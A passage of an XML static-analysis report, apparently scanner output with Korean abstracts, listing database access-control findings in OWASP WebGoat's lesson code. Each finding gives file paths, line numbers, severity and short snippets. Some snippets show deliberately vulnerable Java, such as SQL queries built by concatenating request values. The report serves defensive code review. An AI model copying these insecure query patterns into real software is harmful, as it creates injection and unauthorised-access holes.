				ResultSet answer_results = answer_statement.executeQuery( query );
				if (answer_results.next())
					name = answer_results.getString("first_name");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>274</LineStart>
<Snippet>		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4A78254DEA6FDD461CC501CAA4E5B06B" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 ListStaff.java의 getAllEmployees() 메서드는 공격자가 제어하는 기본 키를 포함하는 98 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E657A5419784596E93B1184DCCC75670" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 SoapRequest.java의 getResults() 메서드는 공격자가 제어하는 기본 키를 포함하는 419 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>419</LineStart>
<Snippet>	    PreparedStatement ps = connection
		    .prepareStatement("SELECT * FROM user_data WHERE userid = ?");
	    ps.setInt(1, id);
	    try
	    {</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>453</LineStart>
<Snippet>

    public String getFirstName(int id)
    {
	String result = getResults(id, "first_name");</Snippet>
<TargetFunction>getFirstName(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7940141AF36A489B515D0ED18BEF8CA8" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 CSRF.java의 addMessage() 메서드는 공격자가 제어하는 기본 키를 포함하는 96 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>96</LineStart>
<Snippet>			statement.setInt(1, count++);
			statement.setString(2, title);
			statement.setString(3, message);
			statement.setString(4, s.getUserName());
			statement.executeQuery();</Snippet>
<TargetFunction>java.sql.PreparedStatement.setString()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9ECC76100D7C49AE7F943073E082071E" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorized() 메서드는 공격자가 제어하는 기본 키를 포함하는 256 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>256</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				authorized = answer_results.first();
				</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>271</LineStart>
<Snippet>		enterprise = "true".equals( servlet.getInitParameter( ENTERPRISE ) );
		feedbackAddress = servlet.getInitParameter( FEEDBACK_ADDRESS ) != null ? servlet
				.getInitParameter( FEEDBACK_ADDRESS ) : feedbackAddress;
		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A85A6D8893FDFFB853190590C8B710A8" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorized() 메서드는 공격자가 제어하는 기본 키를 포함하는 265 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>265</LineStart>
<Snippet>							" AND employee_id = " + employeeId;
					answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
					answer_results = answer_statement.executeQuery( query );
					authorized = answer_results.first();
				}</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Controller.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/servlets/Controller.java</FilePath>
<LineStart>65</LineStart>
<Snippet>    {

	String userAgent = request.getHeader("user-agent");

	String clientBrowser = "Not known!";</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BE76CEED4482369CF9672F28D427452F" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 SqlStringInjection.java의 parameterizedQuery() 메서드는 공격자가 제어하는 기본 키를 포함하는 193 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>193</LineStart>
<Snippet>			query, ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		statement.setString(1, accountName);
		ResultSet results = statement.executeQuery();
</Snippet>
<TargetFunction>java.sql.PreparedStatement.setString()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="84FFE5168E43537E8D8CFDCAAA9B69C7" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 CSRF.java의 makeCurrent() 메서드는 공격자가 제어하는 기본 키를 포함하는 240 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>240</LineStart>
<Snippet>			PreparedStatement statement = connection.prepareStatement( query, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
			statement.setString(1, getNameroot( s.getUserName() ) + "%");
			statement.setInt(2, messageNum);
			ResultSet results = statement.executeQuery();
</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9ECC76100D7C49AE7F943073E082071F" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorized() 메서드는 공격자가 제어하는 기본 키를 포함하는 265 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>265</LineStart>
<Snippet>							" AND employee_id = " + employeeId;
					answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
					answer_results = answer_statement.executeQuery( query );
					authorized = answer_results.first();
				}</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>271</LineStart>
<Snippet>		enterprise = "true".equals( servlet.getInitParameter( ENTERPRISE ) );
		feedbackAddress = servlet.getInitParameter( FEEDBACK_ADDRESS ) != null ? servlet
				.getInitParameter( FEEDBACK_ADDRESS ) : feedbackAddress;
		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="537215A55A139B75824DDAA931320440" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 FindProfile.java의 findEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 145 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/FindProfile.java</FilePath>
<LineStart>145</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setString(1, "%" + pattern + "%");
		answer_statement.setString(2, "%" + pattern + "%");
		ResultSet answer_results = answer_statement.executeQuery();
</Snippet>
<TargetFunction>java.sql.PreparedStatement.setString()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B633EF04A9935A253B0DAA0AC19A3B47" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 SoapRequest.java의 getResults() 메서드는 공격자가 제어하는 기본 키를 포함하는 419 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>419</LineStart>
<Snippet>	    PreparedStatement ps = connection
		    .prepareStatement("SELECT * FROM user_data WHERE userid = ?");
	    ps.setInt(1, id);
	    try
	    {</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>481</LineStart>
<Snippet>

    public String getLoginCount(int id)
    {
	String result = getResults(id, "login_count");</Snippet>
<TargetFunction>getLoginCount(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0AB4959EA5D215B181FE4194059D2DCC" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 EditProfile.java의 getEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 96 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>96</LineStart>
<Snippet>				ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C12753C200D0A523D0CA7A7174F62E2D" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 EditProfile.java의 getEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 96 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>96</LineStart>
<Snippet>				ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D4CA4F4B439D3CC5963FD05C00F57F0F" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorized() 메서드는 공격자가 제어하는 기본 키를 포함하는 256 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>256</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				authorized = answer_results.first();
				</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="828B4C08016E2D231D17CD37B0D68322" ruleID="264C499A-C0F5-479E-9758-9E8C24468D70">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 UpdateProfile.java의 createEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 340 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>142</LineStart>
<Snippet>	String startDate = request.getParameter(CrossSiteScripting.START_DATE);
	int salary = Integer.parseInt(request
		.getParameter(CrossSiteScripting.SALARY));
	String ccn = request.getParameter(CrossSiteScripting.CCN);
	int ccnLimit = Integer.parseInt(request</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5C469213CFD768DB1DF3299735C7D8C4" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 WSDLScanning.java의 getResults() 메서드는 공격자가 제어하는 기본 키를 포함하는 281 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>281</LineStart>
<Snippet>	    PreparedStatement ps = connection
		    .prepareStatement("SELECT * FROM user_data WHERE userid = ?");
	    ps.setInt(1, id);
	    try
	    {</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>311</LineStart>
<Snippet>

    public String getFirstName(int id)
    {
	String result = getResults(id, "first_name");</Snippet>
<TargetFunction>getFirstName(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="941FE9CEA339A71D43ACDFB2FB8350F4" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorizedForEmployee() 메서드는 공격자가 제어하는 기본 키를 포함하는 312 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>312</LineStart>
<Snippet>				PreparedStatement answer_statement = WebSession.getConnection(s).prepareStatement( query, 
						ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				answer_statement.setInt(1, userId);
				answer_statement.setInt(2, employeeId);
				ResultSet answer_results = answer_statement.executeQuery();</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>271</LineStart>
<Snippet>		enterprise = "true".equals( servlet.getInitParameter( ENTERPRISE ) );
		feedbackAddress = servlet.getInitParameter( FEEDBACK_ADDRESS ) != null ? servlet
				.getInitParameter( FEEDBACK_ADDRESS ) : feedbackAddress;
		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="924C5A60F61CA197AB650BDB09E7A71A" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 FindProfile.java의 findEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 176 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/FindProfile.java</FilePath>
<LineStart>176</LineStart>
<Snippet>				ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setString(1, "%" + pattern + "%");
		answer_statement.setString(2, "%" + pattern + "%");
		ResultSet answer_results = answer_statement.executeQuery();</Snippet>
<TargetFunction>java.sql.PreparedStatement.setString()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F5DB2399BCF45F26A9D0E56DAB79DB5D" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 CSRF.java의 addMessage() 메서드는 공격자가 제어하는 기본 키를 포함하는 95 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>95</LineStart>
<Snippet>			PreparedStatement statement = connection.prepareStatement( query, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
			statement.setInt(1, count++);
			statement.setString(2, title);
			statement.setString(3, message);
			statement.setString(4, s.getUserName());</Snippet>
<TargetFunction>java.sql.PreparedStatement.setString()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E175C0818A393F8AC66003EF1E53532D" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 StoredXss.java의 addMessage() 메서드는 공격자가 제어하는 기본 키를 포함하는 105 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>105</LineStart>
<Snippet>		    ResultSet.CONCUR_READ_ONLY);
	    statement.setInt(1, count++);
	    statement.setString(2, title);
	    statement.setString(3, message);
	    statement.setString(4, s.getUserName());</Snippet>
<TargetFunction>java.sql.PreparedStatement.setString()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1FAB71AF57A440BAA42421161CC163EA" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 ListStaff.java의 getAllEmployees() 메서드는 공격자가 제어하는 기본 키를 포함하는 98 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FEC57B833988B9E526A96A059169CE19" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 StoredXss.java의 addMessage() 메서드는 공격자가 제어하는 기본 키를 포함하는 106 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>106</LineStart>
<Snippet>	    statement.setInt(1, count++);
	    statement.setString(2, title);
	    statement.setString(3, message);
	    statement.setString(4, s.getUserName());
	    statement.executeQuery();</Snippet>
<TargetFunction>java.sql.PreparedStatement.setString()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
